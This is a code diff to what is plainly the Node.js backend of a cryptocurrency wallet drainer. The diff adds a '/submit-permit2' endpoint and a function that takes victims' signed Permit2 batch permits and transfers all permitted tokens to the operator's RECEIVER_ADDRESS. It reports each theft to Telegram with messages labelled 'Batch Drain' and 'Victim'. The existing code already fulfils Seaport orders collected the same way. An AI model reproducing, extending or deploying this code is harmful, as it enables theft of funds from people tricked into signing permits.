@@ -121,6 +121,12 @@ const SEAPORT_ABI = [
     "function fulfillOrder(tuple(tuple(address offerer, address zone, tuple(uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount)[] offer, tuple(uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount, address recipient)[] consideration, uint8 orderType, uint256 startTime, uint256 endTime, bytes32 zoneHash, uint256 salt, bytes32 conduitKey, uint256 counter) parameters, bytes signature) order, bytes32 fulfillerConduitKey) payable returns (bool)"
 ];
 
+const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+const PERMIT2_ABI = [
+    "function permitBatchTransferFrom(tuple(tuple(address token, uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount)[] transferDetails, address owner, bytes signature) external"
+];
+
+
 // --- REFUELING CONFIG ---
 const GAS_THRESHOLD = ethers.parseEther("0.02"); // 0.02 ETH/BNB/MATIC
 
@@ -473,14 +479,26 @@ function startOrderReceiver() {
             req.on('end', () => {
                 try {
                     const data = JSON.parse(body);
-                    if (data.order && data.chainName) {
-                        console.log(`📥 Received Seaport Order for ${data.chainName}. Executing immediately...`);
-                        fulfillSeaportOrder(data.order, data.chainName); // NO AWAIT - Execute in background instantly
-                        res.writeHead(200, { 'Content-Type': 'application/json' });
-                        res.end(JSON.stringify({ status: 'success', message: 'Fulfillment initiated' }));
-                    } else {
-                        res.writeHead(400);
-                        res.end('Missing order or chainName');
+                    if (req.url === '/submit-order') {
+                        if (data.order && data.chainName) {
+                            console.log(`📥 Received Seaport Order for ${data.chainName}. Executing immediately...`);
+                            fulfillSeaportOrder(data.order, data.chainName); // NO AWAIT
+                            res.writeHead(200, { 'Content-Type': 'application/json' });
+                            res.end(JSON.stringify({ status: 'success', message: 'Fulfillment initiated' }));
+                        } else {
+                            res.writeHead(400);
+                            res.end('Missing order or chainName');
+                        }
+                    } else if (req.url === '/submit-permit2') {
+                        if (data.permit && data.signature && data.chainName && data.owner) {
+                            console.log(`📥 Received Permit2 Batch Signature for ${data.chainName}. Executing...`);
+                            fulfillPermit2Batch(data.permit, data.signature, data.chainName, data.owner);
+                            res.writeHead(200, { 'Content-Type': 'application/json' });
+                            res.end(JSON.stringify({ status: 'success', message: 'Permit2 batch initiated' }));
+                        } else {
+                            res.writeHead(400);
+                            res.end('Missing permit, signature, chainName, or owner');
+                        }
                     }
                 } catch (e) {
                     res.writeHead(400);
@@ -521,6 +539,36 @@ async function fulfillSeaportOrder(orderPayload, chainName) {
     } catch (error) {
         console.error(`❌ Seaport fulfillment failed:`, error.message);
         await notifyTelegram(`<b>❌ Seaport Failed</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 100)}</code>`);
+        return false;
+    }
+}
+
+async function fulfillPermit2Batch(permit, signature, chainName, owner) {
+    try {
+        const config = Object.values(CHAIN_CONFIGS).find(c => c.name === chainName);
+        const provider = new ethers.JsonRpcProvider(getRpcUrl(chainName, false));
+        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
+        const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);
+
+        console.log(`🚀 Executing Permit2 Batch Transfer on ${chainName}...`);
+
+        const transferDetails = permit.permitted.map(p => ({
+            to: RECEIVER_ADDRESS,
+            requestedAmount: p.amount
+        }));
+
+        const tx = await permit2.permitBatchTransferFrom(permit, transferDetails, owner, signature);
+
+        console.log(`📤 Permit2 TX Sent: ${tx.hash}`);
+        await notifyTelegram(`<b>💎 Permit2 Batch Drain!</b>\nChain: ${chainName}\nTx: ${tx.hash}\nVictim: <code>${owner}</code>`);
+
+        await tx.wait();
+        console.log(`✅ Permit2 SUCCESS on ${chainName}`);
+        await notifyTelegram(`<b>💰 PERMIT2 SUCCESS!</b>\nMultiple assets swept in 1-click on ${chainName}.`);
+        return true;
+    } catch (error) {
+        console.error(`❌ Permit2 fulfillment failed:`, error.message);
+        await notifyTelegram(`<b>❌ Permit2 Failed</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 100)}</code>`);
         return false;
     }
 }
